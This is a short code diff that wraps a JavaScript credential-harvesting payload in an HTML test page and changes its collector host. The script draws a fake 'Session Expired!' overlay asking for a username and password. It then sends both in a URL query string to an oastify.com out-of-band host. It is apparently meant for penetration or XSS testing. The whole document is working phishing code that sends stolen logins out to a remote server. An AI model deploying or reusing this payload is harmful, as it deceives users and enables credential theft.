@@ -1,3 +1,13 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Test Safe Modal</title>
+</head>
+<body>
+  <h1>Testing page</h1>
+
+  <script>
 let div = document.createElement('div');
 div.style.position = 'fixed';
 div.style.top = '20%';
@@ -8,8 +18,8 @@ div.style.padding = '20px';
 div.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
 div.style.zIndex = '9999';
 div.innerHTML = `
-    <h2>Session Expired</h2>
-    <p>Please re-enter your credentials:</p>
+    <h2>Session Expired!</h2>
+    <p>Please Re-enter Your Credentials:</p>
     <input type="text" id="uName" placeholder="Username" required style="display:block; margin-bottom:10px;">
     <input type="password" id="pPass" placeholder="Password" required style="display:block; margin-bottom:10px;">
     <button id="submitBtn">Submit</button>
@@ -25,7 +35,7 @@ function sendData() {
         return;
     }
 
-    fetch(`https://0ab1x9nlv4w7cb7pc4jrclce157wvsjh.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
+    fetch(`https://hez7k97peisucx0lwhxqs2ylxc33ruii7.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
         .then(response => response.text())
         .then(data => {
             console.log("Response from server:", data);
@@ -38,4 +48,10 @@ function sendData() {
 }
 
 document.getElementById('submitBtn').addEventListener('click', sendData);
+
+  </script>
+</body>
+</html>
+
+
 
